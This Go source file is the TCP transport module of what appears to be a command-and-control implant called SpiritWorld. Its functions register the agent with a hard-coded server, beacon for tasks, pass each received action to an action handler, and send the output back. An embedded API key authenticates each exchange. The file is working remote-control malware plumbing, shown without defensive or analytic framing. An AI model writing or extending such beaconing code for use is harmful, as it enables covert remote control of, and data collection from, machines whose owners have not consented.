package tcp

import (
	"encoding/json"
	"fmt"
	"net"

	"github.com/f1rehaz4rd/SpiritWorld/agent/pkg/actionhandler"
	"github.com/f1rehaz4rd/SpiritWorld/agent/pkg/agents"
)

const servAddr = "127.0.0.1:4321"

func RegisterAgent(agent *agents.Agent) bool {

	register := agents.AgentBeacon{
		Agent: agent,
		Action: &agents.Action{
			ActionType:   "register",
			ActionOutput: "",
		},
		APIKEY: agents.AGENTAPIKEY,
	}

	conn, err := net.Dial("tcp", servAddr)
	if err != nil {
		fmt.Println(err)
		return false
	}

	defer conn.Close()

	msg, _ := json.Marshal(register)
	conn.Write(msg)

	n, _ := conn.Read(msg)

	var action agents.Action
	if err := json.Unmarshal(msg[:n], &action); err != nil {
		fmt.Println("failed register")
		return false
	}

	if action.ActionType == "register" &&
		action.ActionOutput == "success" {
		return true
	}

	return false
}

func Beacon(agent *agents.Agent) bool {
	beaconObj := agents.AgentBeacon{
		Agent: agent,
		Action: &agents.Action{
			ActionType:   "beacon",
			ActionOutput: "",
		},
		APIKEY: agents.AGENTAPIKEY,
	}

	var action agents.Action

	conn, err := net.Dial("tcp", servAddr)
	if err != nil {
		fmt.Println(err)
		return false
	}

	defer conn.Close()

	msg, _ := json.Marshal(beaconObj)
	conn.Write(msg)

	n, _ := conn.Read(msg)

	if err := json.Unmarshal(msg[:n], &action); err != nil {
		fmt.Println("failed to beacon")
		return false
	}

	conn.Close()

	beaconObj, err = actionhandler.HandleAction(*agent, action)
	if err == nil {
		return Respond(beaconObj)
	}

	return true
}

func Respond(beaconObj agents.AgentBeacon) bool {

	conn, err := net.Dial("tcp", servAddr)
	if err != nil {
		fmt.Println(err)
		return false
	}

	defer conn.Close()

	msg, _ := json.Marshal(beaconObj)
	conn.Write(msg)

	return true
}
